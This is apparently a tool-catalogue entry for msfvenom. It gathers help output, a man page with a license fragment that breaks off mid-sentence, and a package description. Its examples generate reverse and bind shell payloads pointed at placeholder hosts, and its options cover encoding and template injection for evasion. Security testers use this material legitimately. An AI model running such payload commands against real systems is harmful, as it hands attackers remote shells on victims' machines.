        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
        --refresh-cache              Rebuild the module metadata cache from disk before listing
    -h, --help                       Show this message
local_help.-h:

Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom

    -f, --format          <format>   Output format (use --list formats to list)

    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)

    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
        --refresh-cache              Rebuild the module metadata cache from disk before listing
    -h, --help                       Show this message
local_help.help:
Error: No options
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
        --refresh-cache              Rebuild the module metadata cache from disk before listing
    -h, --help                       Show this message
local_help.man:
MSFVENOM(1)             Metasploit Framework - msfvenom             MSFVENOM(1)

NAME
     msfvenom - Payload Generator and Encoder

SYNOPSIS
     msfvenom [options] <var=val>

DESCRIPTION
     Msfvenom  is  a  combination  of Msfpayload and Msfencode, putting both of
     these tools into a single Framework instance. Msfvenom has  replaced  both
     msfpayload and msfencode as of June 8th, 2015.

OPTIONS
     -p,  --payload  [payload]  Payload  to  use. Specify a '-' or stdin to use
     custom payloads
         --payload-options   List the payload's standard options

     -l, --list  [module_type]
            List a module type example: payloads, encoders, nops, all

     -n, --nopsled  [length]
            Prepend a nopsled of [length] size on to the payload

     -f, --format  [format]
            Output format (use --help-formats for a list)

     --help-formats
            List available formats

     -e, --encoder  [encoder]
            The encoder to use

     -a, --arch  [architecture]
            The architecture to use

     --platform   [platform]
            The platform of the payload
            Cisco or cisco, OSX or osx, Solaris or solaris, BSD or bsd, OpenBSD
            or openbsd, Firefox or firefox, BSDi or  bsdi,  NetBSD  or  netbsd,
            NodeJS or nodejs, FreeBSD or freebsd, Python or python, AIX or aix,
            JavaScript  or  javascript, HPUX or hpux, PHP or php, Irix or irix,
            Unix or unix, Linux or linux, Ruby or ruby, Java or  java,  Android
            or android, Netware or netware, Windows or windows

     -s, --space [length] The maximum size of the resulting payload
         --encoder-space [length]
           The maximum size of the encoded payload (defaults to the -s value)

     -b, --bad-chars  [list]
            The list of characters to avoid example: '\x00\xff'

     -i, --iterations  [count]
            The number of times to encode the payload

     -c, --add-code  [path]
            Specify an additional win32 shellcode file to include

     -x, --template  [path]
            Specify a custom executable file to use as a template

     -k, --keep
            Preserve  the  template  behavior  and  inject the payload as a new
            thread

     -o, --out  [path]
            Save the payload

     -v, --var-name  [name]
            Specify a custom variable name to use for certain output formats

     --smallest
            Generate the smallest possible payload

     -h, --help
            Show this message

     --help-formats
            List available formats

EXAMPLE
     msfvenom    --platform    Windows     -p     windows/shell/bind_tcp     -e
     x86/shikata_ga_nai -b "\x00" -f python
     msfvenom  --platform  linux  -p  linux/x86/shell/reverse_tcp LHOST=w.z.y.z
     LPORT=443 -b "\x00" -f elf -o file.bin

     For more examples visit  https://www.offensive-security.com/metasploit-un-
     leashed/msfvenom

SEE ALSO
     msfcli(1) - deprecated -
     msfconsole(1)
     msfpayload(1) - deprecated -
     msfencode(1) - deprecated -

AUTHOR(S)
     Creator
            HD Moore - @hdmoore / hdm@metasploit.com
            Man  Page  Author:  Kali  Linuxtm  File  man  page  bug  reports at
            https://bugs.kali.org

            may be used to endorse or promote products derived from this  soft-
            ware without specific prior written permission.

            THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
            "AS  IS"  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT

apt_metadata.description:
Framework for exploit development and vulnerability research
The Metasploit Framework is an open source platform that supports
vulnerability research, exploit development, and the creation of custom
security tools.

use_cases: Use as a candidate tool in the chain planner; review provenance before use.
Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.
